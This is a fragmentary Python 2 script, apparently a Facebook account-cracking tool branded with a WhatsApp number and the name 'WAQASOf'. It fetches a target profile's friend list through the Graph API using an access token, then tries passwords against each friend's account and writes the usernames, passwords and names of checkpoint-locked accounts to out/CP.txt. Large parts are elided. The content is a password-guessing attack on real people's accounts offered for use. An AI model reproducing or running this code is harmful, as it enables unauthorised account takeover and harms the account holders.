...
\033[1;97m ─▀█▓▓▒▒░░░░░░░░░▒▒▓▓█▀
\033[1;98m ───▀█▓▓▒▒░░░░░▒▒▓▓█▀ 
\033[1;99m ─────▀█▓▓▒▒░▒▒▓▓█▀  \033[1;98mWhatsApp
\033[1;92m ──────▀█▓▓▒▓▓█▀    \033[1;98m +923170424820
\033[1;92m ────────▀█▓█▀
\033[1;93m ──────────▀
...
def login():
	...
	try:
		...
		jalan(' \033[1;94mWAQASOf Facebook' ) 
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m≻\033[1;95mLink ID\033[1;95m: \033[1;95m")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;94m[✔] Name\033[1;94m:\033[1;94m "+op["name"]
		except KeyError:
	...
	print "\033[1;94m[✔] Total Friends \033[1;94m: \033[1;94m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;91m[7day] \033[1;95m ' + user  + ' \x1b[1;36;95m|\033[1;95m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
